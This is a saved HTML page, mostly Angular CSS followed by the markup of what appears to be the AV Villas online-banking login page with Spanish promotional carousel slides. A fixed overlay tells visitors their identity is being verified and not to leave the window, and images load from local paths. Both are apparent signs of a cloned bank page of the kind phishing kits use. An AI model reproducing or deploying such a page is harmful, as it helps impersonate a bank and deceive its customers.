    .bavv-form-input.loading.dropdown[_ngcontent-qmv-c38] .bavv-form-icon[_ngcontent-qmv-c38] {
      display: none
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] {
      width: initial;
      height: 32px
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .label[_ngcontent-qmv-c38] {
      display: none
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] input[_ngcontent-qmv-c38] {
      font-size: 12px;
      width: initial;
      height: initial;
      padding: 8px 16px
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .form-border[_ngcontent-qmv-c38] {
      position: initial
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] label[_ngcontent-qmv-c38] .form-icon[_ngcontent-qmv-c38] {
      font-size: 20px;
      top: 4px;
      right: 8px
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38] {
      width: 110%;
      top: 31px;
      border-radius: 4px
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38]>li[_ngcontent-qmv-c38] {
      padding: 8px 8px 8px 16px;
      min-height: 40px
    }

    .bavv-form-input.sm[_ngcontent-qmv-c38] .dropdown-list[_ngcontent-qmv-c38]>li[_ngcontent-qmv-c38]>span[_ngcontent-qmv-c38] {
      font-size: 14px;
      padding: 0
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c39_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c39_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .bavv-form-input[_ngcontent-qmv-c39] {
      position: relative;
      font-size: 16px;
      padding: 0 0 32px
    }

    .bavv-form-input[_ngcontent-qmv-c39] avv-validation-messages .validation-message {
      color: #fff;
      margin-top: 3px
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] {
      position: relative;
      margin: auto;
      display: flex;
      width: 100%;
      height: 3.5rem;
      -webkit-user-select: none;
      user-select: none;
      border-radius: 4px;
      border: 1px solid rgba(241, 243, 246, .4)
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .label[_ngcontent-qmv-c39] {
      position: absolute;
      top: 1.125rem;
      left: 1rem;
      font-size: 1rem;
      overflow: hidden;
      color: #77899a;
      transform-origin: 0 0;
      transition: transform .2s ease
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .bavv-form-border[_ngcontent-qmv-c39] {
      position: absolute;
      bottom: -1px;
      left: 0;
      height: 2px;
      border-radius: 0 0 4px 4px;
      width: 100%;
      background: #0048DB;
      transform: scaleX(0);
      transform-origin: 0 0;
      transition: all .15s ease, padding 0s
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .bavv-form-icon[_ngcontent-qmv-c39],
    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .alert-icon[_ngcontent-qmv-c39] {
      font-size: 1.5rem;
      top: 14px;
      right: 16px;
      margin: 0;
      padding: 0;
      position: absolute;
      color: #77899a;
      opacity: 0;
      visibility: hidden;
      transition: .15s
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .bavv-form-icon.preserve[_ngcontent-qmv-c39],
    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .alert-icon.preserve[_ngcontent-qmv-c39] {
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[type=number][_ngcontent-qmv-c39]::-webkit-outer-spin-button,
    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[type=number][_ngcontent-qmv-c39]::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[type=number][_ngcontent-qmv-c39] {
      -moz-appearance: textfield
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] span[_ngcontent-qmv-c39] {
      color: #2c2c33 !important
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39] {
      -webkit-appearance: none;
      width: 100%;
      border: 0;
      font-family: inherit;
      padding: 26px 48px 6px 16px;
      height: 3.375rem;
      font-size: 1rem;
      background: none;
      border-radius: 4px;
      transition: all .15s ease, padding 0s;
      background-color: #fff !important;
      color: #2c2c33 !important
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input.ng-touched.ng-invalid[_ngcontent-qmv-c39]+.label[_ngcontent-qmv-c39] {
      color: #a00104;
      transform: translateY(-12px) scale(.75)
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input.ng-touched.ng-invalid[_ngcontent-qmv-c39]+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39] {
      transform: scaleX(1);
      background: #A00104
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input.ng-touched.ng-invalid[_ngcontent-qmv-c39]+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.alert-icon[_ngcontent-qmv-c39] {
      color: #a00104;
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input.ng-touched.ng-invalid[_ngcontent-qmv-c39]+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.alert-icon[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39] {
      color: #a00104;
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:hover {
      background: #F1F3F6
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown)+.label[_ngcontent-qmv-c39] {
      color: #0048db;
      transform: translateY(-12px) scale(.75)
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown)+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39] {
      opacity: 1;
      visibility: visible
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus {
      background: none;
      outline: none
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus+.label[_ngcontent-qmv-c39] {
      color: #0048db;
      transform: translateY(-12px) scale(.75)
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39] {
      transform: scaleX(1)
    }

    .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39] {
      opacity: 1;
      visibility: visible
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] {
      border: 1px solid #DEE1E4
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .bavv-form-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .bavv-form-icon[_ngcontent-qmv-c39],
    .login-container[_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .alert-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .alert-icon[_ngcontent-qmv-c39] {
      font-size: 1.5rem;
      top: 14px;
      right: 16px;
      margin: 0;
      padding: 0;
      position: absolute;
      color: #77899a;
      opacity: 0;
      visibility: hidden;
      transition: .15s
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] .currency-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] .currency-icon[_ngcontent-qmv-c39] {
      display: none;
      position: absolute;
      top: 26px;
      left: 16px;
      color: #414a53
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.currency-not-empty[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.currency-not-empty[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39] {
      padding-left: 32px
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.currency-not-empty[_ngcontent-qmv-c39] .currency-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.currency-not-empty[_ngcontent-qmv-c39] .currency-icon[_ngcontent-qmv-c39] {
      display: inline-block
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] .franchise-img[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] .franchise-img[_ngcontent-qmv-c39] {
      height: 16px;
      width: 30px;
      margin: auto 0 12px 15px
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] .pl-8[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input[_ngcontent-qmv-c39] .pl-8[_ngcontent-qmv-c39] {
      padding-left: 8px !important
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .label[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .label[_ngcontent-qmv-c39] {
      padding-left: 30px
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .bavv-form-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] .bavv-form-icon[_ngcontent-qmv-c39] {
      visibility: visible;
      opacity: 1;
      left: 16px;
      right: initial
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39] {
      padding-left: 50px
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown),
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown),
    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus,
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus {
      padding-left: 40px
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown)+.label[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown)+.label[_ngcontent-qmv-c39],
    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus+.label[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus+.label[_ngcontent-qmv-c39] {
      padding-left: 0
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown)+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:not(:placeholder-shown)+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39],
    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input[_ngcontent-qmv-c39]:focus+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39] {
      top: 27px;
      font-size: 18px
    }

    .login-container[_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input.ng-invalid[_ngcontent-qmv-c39]+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.alert-icon[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39],
    .login-container [_nghost-qmv-c39] .bavv-form-input.keep-icon[_ngcontent-qmv-c39] label[_ngcontent-qmv-c39] input.ng-invalid[_ngcontent-qmv-c39]+.label[_ngcontent-qmv-c39]+.bavv-form-border[_ngcontent-qmv-c39]+.alert-icon[_ngcontent-qmv-c39]+.bavv-form-icon[_ngcontent-qmv-c39] {
      top: 27px;
      font-size: 18px
    }
  </style>
  <style>
    [_nghost-qmv-c67] {
      display: inline-block
    }
  </style>
  <style>
    @keyframes _ngcontent-qmv-c27_arrows {
      0% {
        opacity: 0;
        transform: rotate(45deg) translate(-10px, -10px)
      }

      50% {
        opacity: 1
      }

      to {
        opacity: 0;
        transform: rotate(45deg) translate(0)
      }
    }

    @keyframes _ngcontent-qmv-c27_spin {
      to {
        transform: rotate(360deg)
      }
    }

    .campaign-container[_ngcontent-qmv-c27] {
      width: 100%;
      height: 638px;
      display: flex;
      align-items: center;
      justify-content: space-evenly;
      flex-direction: column
    }

    .campaign-container_header[_ngcontent-qmv-c27] {
      max-width: 600px
    }

    .campaign-container_header-title[_ngcontent-qmv-c27],
    .campaign-container_header-subtitle[_ngcontent-qmv-c27] {
      text-align: center;
      font-size: 24px;
      line-height: 36px;
      font-weight: 400;
      color: #252b31
    }

    .campaign-container_content[_ngcontent-qmv-c27] {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column
    }

    .campaign-container_content.template_3[_ngcontent-qmv-c27] {
      flex-direction: row
    }

    .campaign-container_content-image[_ngcontent-qmv-c27] {
      width: 370px;
      height: 370px;
      margin-bottom: 24px
    }

    .campaign-container_content-image[_ngcontent-qmv-c27] img[_ngcontent-qmv-c27] {
      object-fit: none;
      width: 370px;
      height: 370px
    }

    .campaign-container_content-description[_ngcontent-qmv-c27] {
      text-align: center;
      max-width: 600px;
      font-size: 20px;
      line-height: 32px;
      font-weight: 400;
      color: #252b31
    }

    .campaign-container_content-description.template_2[_ngcontent-qmv-c27] {
      text-align: left;
      font-size: 16px;
      line-height: 24px;
      font-weight: 400;
      color: #252b31;
      -moz-column-count: 2;
      column-count: 2;
      -moz-column-fill: balance;
      column-fill: balance;
      -moz-column-rule: 1px solid #77899A;
      column-rule: 1px solid #77899A;
      -moz-column-gap: 70px;
      column-gap: 70px
    }

    .campaign-container_content-description.template_3[_ngcontent-qmv-c27] {
      text-align: left
    }

    .campaign-container_footer[_ngcontent-qmv-c27] {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: flex-end;
      flex-direction: row
    }

    .campaign-container_footer[_ngcontent-qmv-c27] a[_ngcontent-qmv-c27] {
      font-size: 16px;
      line-height: 23px;
      font-weight: 600;
      text-decoration: underline
    }
  </style>
  <script type="text/javascript" src="http://c.oracleinfinity.io/acs/common/js/1.3.34/common.js" async="true" defer="true"></script>
  <script type="text/javascript" src="http://c.oracleinfinity.io/acs/account/iw64uzydss/js/main/analytics-default/analytics.js" async="true" defer="true"></script>
</head>

<body class="">
  <div class="position-fixed flex-column align-items-center justify-content-center h-100 w-100 " style="background:rgba(255, 255, 255, .8);display: flex;justify-content: center;z-index: 99999 !important;">
    <div class="spinner-border my-4 text-primary" role="status">
    </div>
    <p class="fs-3">Aguarde un instante...</p>
    <p class="fw-bold" id="mensaje2">Estamos verficando su identidad.</p>
    <p class="fw-bold" id="mensaje3">No abandone esta ventana</p>
  </div>
  <app-root _nghost-qmv-c239="" ng-version="15.2.10"><router-outlet _ngcontent-qmv-c239=""></router-outlet><app-auth class="ng-star-inserted"><!---->
      <div class="auth-container"><img alt="Banca Digital AV Villas" draggable="false" class="auth-container_background-top-mobile d-md-none ng-star-inserted" src="./img/login-background-top-mobile.svg"><img alt="Banca Digital AV Villas" draggable="false" class="auth-container_background-bottom-mobile d-md-none ng-star-inserted" src="./img/login-background-bottom-mobile.svg"><!----><!----><img alt="Banca Digital AV Villas" draggable="false" class="auth-container_background-top-desktop d-none d-md-block" src="./img/login-background-top-desktop.svg"><img alt="Banca Digital AV Villas" draggable="false" class="auth-container_background-bottom-desktop d-none d-md-block" src="./img/login-background-bottom-desktop.svg"><!---->
        <div class="auth-container_marketing d-none d-lg-block"><app-marketing-carousel _nghost-qmv-c28="">
            <div _ngcontent-qmv-c28="" class="marketing-carousel-container">
              <div _ngcontent-qmv-c28="" class="marketing-carousel-container_slides glide glide--ltr glide--carousel glide--swipeable">
                <div _ngcontent-qmv-c28="" data-glide-el="track" class="glide__track">
                  <ul _ngcontent-qmv-c28="" class="glide__slides" style="transition: transform 400ms cubic-bezier(0.165, 0.84, 0.44, 1) 0s; width: 4880px; transform: translate3d(-1830px, 0px, 0px);">
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted glide__slide--clone" style="width: 600px; margin-right: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_1">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title">No comprometas tu seguridad. recuerda siempre</h2>
                            <h3 _ngcontent-qmv-c27="" class="campaign-container_header-subtitle ng-star-inserted">inscribir tu contacto para transferir o pagar</h3><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_1">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./assets/img/illustrations/marketing/campaigns/campaign-3.svg"></div>
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-description template_1 ng-star-inserted"><span _ngcontent-qmv-c27="" class="ng-star-inserted">Asegúrate de inscribir tu contacto, sus cuentas, tarjetas o créditos para realizar tus transferencias o pagos y protege tus transacciones.</span><!----></div><!----><!----><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><a _ngcontent-qmv-c27="" class="avv-title-semibold avv-link ng-star-inserted"> Conocer más </a><!----></div>
                        </div>
                      </app-campaign></li>
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted glide__slide--clone" style="width: 600px; margin-left: 5px; margin-right: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_2">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title"><b>Activa tu Tarjeta Débito Digital Mastercard</b></h2>
                            <h3 _ngcontent-qmv-c27="" class="campaign-container_header-subtitle ng-star-inserted">a través de tu Banca Virtual o AV Villas APP</h3><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_2">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./assets/img/illustrations/marketing/campaigns/campaign-7.png"></div><!---->
                            <ol _ngcontent-qmv-c27="" class="campaign-container_content-description template_2 ng-star-inserted">
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">Exclusiva en Canales Digitales.</li>
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">No tiene costo ni cobro de Cuota de Manejo.</li>
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">Ideal para compras por internet.</li>
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">Puedes asignarle un tope para realizar tus compras.</li><!---->
                            </ol><!----><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><a _ngcontent-qmv-c27="" class="avv-title-semibold avv-link ng-star-inserted"> Conocer más </a><!----></div>
                        </div>
                      </app-campaign></li>
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted" style="width: 600px; margin-left: 5px; margin-right: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_1">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title">Ya puedes agregar tus Favoritos en tu <b>AV Villas APP</b></h2><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_1">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./assets/img/illustrations/marketing/campaigns/campaign-1.svg"></div>
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-description template_1 ng-star-inserted"><span _ngcontent-qmv-c27="" class="ng-star-inserted">Al finalizar tu transacción en el comprobante solo debes dar clic en Guardar Favorito y listo.</span><!----></div><!----><!----><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><!----></div>
                        </div>
                      </app-campaign></li>
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted glide__slide--active" style="width: 600px; margin-left: 5px; margin-right: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_1">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title">¿Necesitas enviar dinero a un amigo o familiar? <b>Transfiere de Celular a Celular</b></h2><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_1">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./img/campaign-2.svg"></div>
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-description template_1 ng-star-inserted"><span _ngcontent-qmv-c27="" class="ng-star-inserted">Ingresa a <b>Transferencias</b> opción <b>Celular a Celular</b> en tu <b>AV Villas App</b> y envía tu dinero sin necesidad de tener el número de cuenta.</span><!----></div><!----><!----><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><a _ngcontent-qmv-c27="" class="avv-title-semibold avv-link ng-star-inserted"> Conocer más </a><!----></div>
                        </div>
                      </app-campaign></li>
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted" style="width: 600px; margin-left: 5px; margin-right: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_1">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title">No comprometas tu seguridad. recuerda siempre</h2>
                            <h3 _ngcontent-qmv-c27="" class="campaign-container_header-subtitle ng-star-inserted">inscribir tu contacto para transferir o pagar</h3><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_1">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./assets/img/illustrations/marketing/campaigns/campaign-3.svg"></div>
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-description template_1 ng-star-inserted"><span _ngcontent-qmv-c27="" class="ng-star-inserted">Asegúrate de inscribir tu contacto, sus cuentas, tarjetas o créditos para realizar tus transferencias o pagos y protege tus transacciones.</span><!----></div><!----><!----><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><a _ngcontent-qmv-c27="" class="avv-title-semibold avv-link ng-star-inserted"> Conocer más </a><!----></div>
                        </div>
                      </app-campaign></li>
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted" style="width: 600px; margin-left: 5px; margin-right: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_2">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title"><b>Activa tu Tarjeta Débito Digital Mastercard</b></h2>
                            <h3 _ngcontent-qmv-c27="" class="campaign-container_header-subtitle ng-star-inserted">a través de tu Banca Virtual o AV Villas APP</h3><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_2">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./assets/img/illustrations/marketing/campaigns/campaign-7.png"></div><!---->
                            <ol _ngcontent-qmv-c27="" class="campaign-container_content-description template_2 ng-star-inserted">
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">Exclusiva en Canales Digitales.</li>
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">No tiene costo ni cobro de Cuota de Manejo.</li>
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">Ideal para compras por internet.</li>
                              <li _ngcontent-qmv-c27="" class="ng-star-inserted">Puedes asignarle un tope para realizar tus compras.</li><!---->
                            </ol><!----><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><a _ngcontent-qmv-c27="" class="avv-title-semibold avv-link ng-star-inserted"> Conocer más </a><!----></div>
                        </div>
                      </app-campaign></li><!---->
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted glide__slide--clone" style="width: 600px; margin-left: 5px; margin-right: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_1">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title">Ya puedes agregar tus Favoritos en tu <b>AV Villas APP</b></h2><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_1">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./assets/img/illustrations/marketing/campaigns/campaign-1.svg"></div>
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-description template_1 ng-star-inserted"><span _ngcontent-qmv-c27="" class="ng-star-inserted">Al finalizar tu transacción en el comprobante solo debes dar clic en Guardar Favorito y listo.</span><!----></div><!----><!----><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_footer"><!----></div>
                        </div>
                      </app-campaign></li>
                    <li _ngcontent-qmv-c28="" class="glide__slide slider-container-item ng-star-inserted glide__slide--clone" style="width: 600px; margin-left: 5px;"><app-campaign _ngcontent-qmv-c28="" _nghost-qmv-c27="">
                        <div _ngcontent-qmv-c27="" class="campaign-container template_1">
                          <div _ngcontent-qmv-c27="" class="campaign-container_header">
                            <h2 _ngcontent-qmv-c27="" class="campaign-container_header-title">¿Necesitas enviar dinero a un amigo o familiar? <b>Transfiere de Celular a Celular</b></h2><!---->
                          </div>
                          <div _ngcontent-qmv-c27="" class="campaign-container_content template_1">
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-image"><img _ngcontent-qmv-c27="" alt="campaign-image" src="./assets/img/illustrations/marketing/campaigns/campaign-2.svg"></div>
                            <div _ngcontent-qmv-c27="" class="campaign-container_content-description template_1 ng-star-inserted"><span _ngcontent-qmv-c27="" class="ng-star-inserted">Ingresa a <b>Transferencias</b> opción <b>Celular a Celular</b> en tu <b>AV Villas App</b> y envía tu dinero sin necesidad de tener el número de cuenta.</span><!----></div><!----><!----><!---->
                          </div>
